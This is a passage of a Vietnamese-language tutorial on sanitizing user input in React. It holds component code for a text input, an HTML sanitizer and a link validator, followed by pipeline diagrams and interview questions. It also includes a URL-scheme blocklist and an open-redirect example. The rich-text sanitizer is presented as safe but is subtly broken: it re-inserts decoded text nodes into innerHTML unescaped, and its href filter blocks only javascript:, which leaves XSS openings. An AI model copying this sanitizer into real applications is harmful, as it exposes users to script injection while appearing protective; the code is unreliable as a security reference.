function SafeTextInput(props) {
  var maxLength = props.maxLength || 200;

  function handleChange(e) {
    var value = e.target.value;

    // Sanitize ngay khi user gõ:
    // Bước 1: Giới hạn độ dài:
    if (value.length > maxLength) {
      value = value.substring(0, maxLength);
    }

    // Bước 2: Xóa control characters:
    value = value.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F]/g, "");

    // Bước 3: Xóa null bytes:
    value = value.replace(/\0/g, "");

    // Gọi parent onChange với value đã sanitize:
    if (props.onChange) {
      props.onChange(value);
    }
  }

  return {
    $$typeof: Symbol.for("react.element"),
    type: "input",
    props: {
      type: "text",
      value: props.value || "",
      onChange: handleChange,
      maxLength: maxLength,
      placeholder: props.placeholder || "",
    },
  };
}

// ② SAFE RICH TEXT DISPLAY — sanitize output:
function SafeRichText(props) {
  var html = props.html || "";

  // Sanitize HTML trước khi render:
  var ALLOWED_TAGS = {
    b: true,
    i: true,
    em: true,
    strong: true,
    p: true,
    br: true,
    ul: true,
    ol: true,
    li: true,
    a: true,
    span: true,
    h1: true,
    h2: true,
    h3: true,
  };

  var ALLOWED_ATTRS = {
    a: { href: true, title: true },
    span: { class: true },
  };

  function sanitizeRichHTML(dirty) {
    // Dùng DOMParser để parse an toàn:
    var parser = new DOMParser();
    var doc = parser.parseFromString(dirty, "text/html");

    function cleanNode(node) {
      if (node.nodeType === 3) return node.textContent; // Text node
      if (node.nodeType !== 1) return ""; // Non-element

      var tagName = node.tagName.toLowerCase();

      // Chặn event handlers:
      if (
        tagName === "script" ||
        tagName === "style" ||
        tagName === "iframe" ||
        tagName === "object"
      ) {
        return ""; // XÓA HOÀN TOÀN!
      }

      if (!ALLOWED_TAGS[tagName]) {
        // Tag không được phép → chỉ lấy text content:
        var textResult = "";
        for (var i = 0; i < node.childNodes.length; i++) {
          textResult += cleanNode(node.childNodes[i]);
        }
        return textResult;
      }

      // Build clean tag:
      var result = "<" + tagName;

      // Chỉ giữ allowed attributes:
      var allowedForTag = ALLOWED_ATTRS[tagName] || {};
      for (var j = 0; j < node.attributes.length; j++) {
        var attr = node.attributes[j];
        if (allowedForTag[attr.name]) {
          var attrValue = attr.value;
          // Chặn javascript: trong href:
          if (attr.name === "href") {
            attrValue = attrValue.replace(/[\t\n\r]/g, "");
            if (/^\s*javascript:/i.test(attrValue)) {
              continue; // BỎ QUA!
            }
          }
          // Escape attribute value:
          attrValue = attrValue.replace(/&/g, "&amp;").replace(/"/g, "&quot;");
          result += " " + attr.name + '="' + attrValue + '"';
        }
      }
      result += ">";

      // Process children:
      for (var k = 0; k < node.childNodes.length; k++) {
        result += cleanNode(node.childNodes[k]);
      }

      // Self-closing tags:
      if (tagName !== "br") {
        result += "</" + tagName + ">";
      }
      return result;
    }

    var cleanHTML = "";
    for (var i = 0; i < doc.body.childNodes.length; i++) {
      cleanHTML += cleanNode(doc.body.childNodes[i]);
    }
    return cleanHTML;
  }

  var cleanHtml = sanitizeRichHTML(html);

  return {
    $$typeof: Symbol.for("react.element"),
    type: "div",
    props: {
      className: "safe-rich-text",
      dangerouslySetInnerHTML: { __html: cleanHtml },
    },
  };
}

// ③ SAFE LINK — validate href:
function SafeLink(props) {
  var href = props.href || "#";

  // Validate URL protocol:
  var decoded = href;
  try {
    decoded = decodeURIComponent(href);
  } catch (e) {}
  decoded = decoded.replace(/[\t\n\r]/g, "").toLowerCase();

  if (
    decoded.indexOf("javascript:") === 0 ||
    decoded.indexOf("vbscript:") === 0 ||
    decoded.indexOf("data:") === 0
  ) {
    href = "#"; // BLOCK!
    console.warn("Blocked dangerous href:", props.href);
  }

  return {
    $$typeof: Symbol.for("react.element"),
    type: "a",
    props: {
      href: href,
      rel: "noopener noreferrer", // Chống tab-nabbing!
      target: props.external ? "_blank" : undefined,
      children: props.children || href,
    },
  };
}
```

```
  SAFE COMPONENT PATTERNS — SƠ ĐỒ:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ① SafeTextInput:                                      │
  │  ┌──────────┐   sanitize    ┌──────────────┐          │
  │  │ User gõ  │───────────→   │ Clean value   │         │
  │  │ input    │  limitLength  │ onChange(val)  │         │
  │  └──────────┘  removeCtrl   └──────────────┘          │
  │                                                        │
  │  ② SafeRichText:                                       │
  │  ┌──────────┐   DOMParser   ┌──────────────┐          │
  │  │ Dirty    │───────────→   │ Clean HTML    │         │
  │  │ HTML     │  whitelist    │ (safe tags)   │         │
  │  └──────────┘  check attrs  └──────────────┘          │
  │                                                        │
  │  ③ SafeLink:                                           │
  │  ┌──────────┐   validate    ┌──────────────┐          │
  │  │ User URL │───────────→   │ Safe <a>     │          │
  │  │          │  protocol     │ + noopener   │          │
  │  └──────────┘  check        └──────────────┘          │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §9. Sanitization Pipeline — Kiến Trúc Hoàn Chỉnh!

```
  REACT SANITIZATION PIPELINE — KIẾN TRÚC TOÀN DIỆN:
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  USER INPUT                                             │
  │  (form, URL, API, file, clipboard, postMessage...)     │
  │       ↓                                                │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │         LỚP 1: VALIDATION (Client-side)         │  │
  │  │  ┌──────────┐ ┌──────────┐ ┌────────────────┐  │  │
  │  │  │ Required │ │ Format   │ │ Type checking  │  │  │
  │  │  │ check    │ │ (email,  │ │ (string, num,  │  │  │
  │  │  │          │ │ phone)   │ │ boolean)       │  │  │
  │  │  └──────────┘ └──────────┘ └────────────────┘  │  │
  │  └──────────────────────────────────────────────────┘  │
  │       ↓                                                │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │         LỚP 2: SANITIZATION (Client-side)       │  │
  │  │  ┌──────────┐ ┌──────────┐ ┌────────────────┐  │  │
  │  │  │ Escape   │ │ Strip    │ │ Normalize      │  │  │
  │  │  │ HTML     │ │ tags     │ │ whitespace     │  │  │
  │  │  │ entities │ │          │ │ + trim         │  │  │
  │  │  └──────────┘ └──────────┘ └────────────────┘  │  │
  │  │  ┌──────────┐ ┌──────────┐ ┌────────────────┐  │  │
  │  │  │ URL      │ │ Remove   │ │ Length         │  │  │
  │  │  │ protocol │ │ control  │ │ limit          │  │  │
  │  │  │ check    │ │ chars    │ │                │  │  │
  │  │  └──────────┘ └──────────┘ └────────────────┘  │  │
  │  └──────────────────────────────────────────────────┘  │
  │       ↓                                                │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │         LỚP 3: CONTEXT ESCAPING                 │  │
  │  │  ┌──────────┐ ┌──────────┐ ┌────────────────┐  │  │
  │  │  │ HTML     │ │ JS       │ │ URL            │  │  │
  │  │  │ context  │ │ context  │ │ context        │  │  │
  │  │  │ escape   │ │ escape   │ │ encode         │  │  │
  │  │  └──────────┘ └──────────┘ └────────────────┘  │  │
  │  └──────────────────────────────────────────────────┘  │
  │       ↓                                                │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │         LỚP 4: REACT RENDERING                  │  │
  │  │  React tự động bảo vệ qua:                      │  │
  │  │  ① createTextNode() — không parse HTML           │  │
  │  │  ② $$typeof Symbol — chống JSON injection       │  │
  │  │  ③ escapeHtml() trong SSR                       │  │
  │  └──────────────────────────────────────────────────┘  │
  │       ↓                                                │
  │  ┌──────────────────────────────────────────────────┐  │
  │  │         LỚP 5: SERVER-SIDE                       │  │
  │  │  ① Parameterized queries (SQL)                  │  │
  │  │  ② Input re-validation                          │  │
  │  │  ③ Output encoding                              │  │
  │  │  ④ CSP headers                                  │  │
  │  └──────────────────────────────────────────────────┘  │
  │       ↓                                                │
  │  ✅ SAFE OUTPUT!                                        │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 9.1. Tại Sao Phải Sanitize Ở Client (React)?

```
  TẠI SAO SANITIZE Ở REACT (CLIENT)?
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  "Server đã bảo vệ rồi, sao phải sanitize ở client?" │
  │                                                        │
  │  ① UX TỐT HƠN:                                        │
  │  → Báo lỗi NGAY khi user gõ!                          │
  │  → Không cần gửi request rồi mới biết sai!            │
  │                                                        │
  │  ② GIẢM TẢI SERVER:                                    │
  │  → Filter input xấu trước khi gửi!                    │
  │  → Server ít phải xử lý request rác!                   │
  │                                                        │
  │  ③ DEFENSE IN DEPTH:                                   │
  │  → Nếu server có bug → client vẫn chặn!               │
  │  → Nhiều lớp bảo vệ = an toàn hơn!                    │
  │                                                        │
  │  ④ CHỐNG DOM-BASED XSS:                                │
  │  → Input → DOM trực tiếp (không qua server)           │
  │  → Ví dụ: URL hash → render                           │
  │  → Server KHÔNG CAN THIỆP ĐƯỢC!                       │
  │  → CHỈ client sanitize mới chặn được!                  │
  │                                                        │
  │  ⑤ THIRD-PARTY DATA:                                   │
  │  → Dữ liệu từ API bên thứ 3                           │
  │  → Không kiểm soát được server khác!                   │
  │  → PHẢI sanitize trước khi render!                     │
  │                                                        │
  │  ⚠️ LƯU Ý: Client sanitize KHÔNG thay thế server!     │
  │  → Client có thể bị bypass (DevTools)!                 │
  │  → PHẢI sanitize CẢ 2 phía!                           │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

---

## §10. Tổng Kết & Câu Hỏi Phỏng Vấn!

### 10.1. Tổng Kết!

```
  TẠI SAO PHẢI SANITIZE INPUT TRONG REACT?
  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  ① REACT BẢO VỆ MẶC ĐỊNH — NHƯNG KHÔNG ĐỦ:           │
  │  → Auto-escape chỉ cho JSX text children!             │
  │  → dangerouslySetInnerHTML → KHÔNG escape!            │
  │  → href="javascript:" → KHÔNG chặn!                   │
  │  → ref.innerHTML → KHÔNG kiểm soát!                   │
  │                                                        │
  │  ② SANITIZE = BẢO VỆ NHIỀU LỚP:                       │
  │  → Validate format (email, phone, URL...)             │
  │  → Escape HTML entities                                │
  │  → Strip dangerous tags/attributes                     │
  │  → Check URL protocols                                 │
  │  → Detect injection patterns                           │
  │  → Limit input length                                  │
  │                                                        │
  │  ③ CONTEXT MATTERS:                                    │
  │  → Escape khác nhau cho HTML/JS/URL/CSS!              │
  │  → Dùng sai context = vẫn bị tấn công!               │
  │                                                        │
  │  ④ DEFENSE IN DEPTH:                                   │
  │  → Client sanitize + Server sanitize!                  │
  │  → Client = UX + chặn DOM-based XSS!                  │
  │  → Server = authority + chặn bypass!                   │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 10.2. Câu Hỏi Phỏng Vấn!

**❓ Q1: Tại sao phải sanitize user input trong React app?**

> Vì React chỉ auto-escape text children trong JSX (qua `createTextNode` ở CSR và `escapeHtml` ở SSR). Nhưng có nhiều vector tấn công mà React KHÔNG chặn: `dangerouslySetInnerHTML`, `href="javascript:"`, `ref.innerHTML`, prop spreading, và SSR JSON injection. Sanitize input đảm bảo **defense-in-depth** — bảo vệ nhiều lớp, giảm tải server, cải thiện UX, và chặn DOM-based XSS mà server không can thiệp được.

**❓ Q2: React đã auto-escape rồi, tại sao vẫn cần sanitize?**

> React auto-escape chỉ hoạt động cho **string children** trong JSX. Nếu dùng `dangerouslySetInnerHTML` để render HTML từ CMS/rich editor, hoặc truyền user input vào `href`, `src`, `style` attributes → React KHÔNG escape. Ngoài ra, DOM-based XSS (input từ URL hash → render) không qua server nên server không thể chặn.

**❓ Q3: Context-aware escaping là gì? Tại sao quan trọng?**

> Cùng một input nhưng nếu đặt trong ngữ cảnh khác nhau (HTML body, HTML attribute, JavaScript string, URL parameter, CSS value) thì cần escape khác nhau. Ví dụ: ký tự `'` trong HTML body escape thành `&#x27;`, trong JS escape thành `\'`, trong URL thành `%27`. Dùng sai escape = vẫn bị tấn công.

**❓ Q4: Sanitize ở client hay server? Hay cả hai?**

> **Cả hai!** Client sanitize cho UX tốt (báo lỗi ngay), giảm tải server, và chặn DOM-based XSS. Server sanitize là bắt buộc vì client có thể bị bypass (DevTools, Postman). Nguyên tắc: **Never trust client-side validation alone!**

**❓ Q5: Làm sao chống SQL injection từ React app?**

> React chạy ở client nên không trực tiếp query database. Nhưng input từ React gửi lên server qua API → nếu server không dùng parameterized queries → SQL injection. Phòng thủ: (1) Client validate + sanitize, (2) Server dùng prepared statements, (3) Database dùng least privilege. React sanitize là **lớp bảo vệ đầu tiên** trong chuỗi defense-in-depth.

**❓ Q6: Liệt kê các loại tấn công có thể xảy ra nếu không sanitize input?**

> 1. **XSS** — Chèn `<script>` hoặc event handlers (`onerror`, `onload`)
> 2. **HTML Injection** — Chèn form giả để phishing
> 3. **CSS Injection** — Thay đổi giao diện, leak data qua `background-image: url()`
> 4. **Open Redirect** — Redirect user sang trang giả qua `?url=evil.com`
> 5. **SQL/NoSQL Injection** — Tấn công database qua API
> 6. **ReDoS** — Regex chậm gây crash
> 7. **Path Traversal** — Đọc file hệ thống qua `../../`
> 8. **Unicode Spoofing** — Giả mạo text bằng ký tự Unicode đặc biệt

**❓ Q7: `dangerouslySetInnerHTML` có cần sanitize không?**

> **BẮT BUỘC!** Tên `dangerously` đã cảnh báo rồi. Khi dùng prop này, React bỏ qua toàn bộ auto-escape và chèn HTML trực tiếp qua `innerHTML`. Phải sanitize bằng cách: whitelist tags/attributes, chặn `javascript:` URLs, xóa event handlers, xóa `<script>`, `<iframe>`, `<object>` tags.

---

> 📝 **Ghi nhớ cuối cùng:**
> "Sanitize input KHÔNG CHỈ là chống XSS — mà là bảo vệ toàn diện ứng dụng khỏi mọi loại injection, phishing, và data corruption. React giúp nhiều, nhưng developer PHẢI chủ động bảo vệ thêm!"
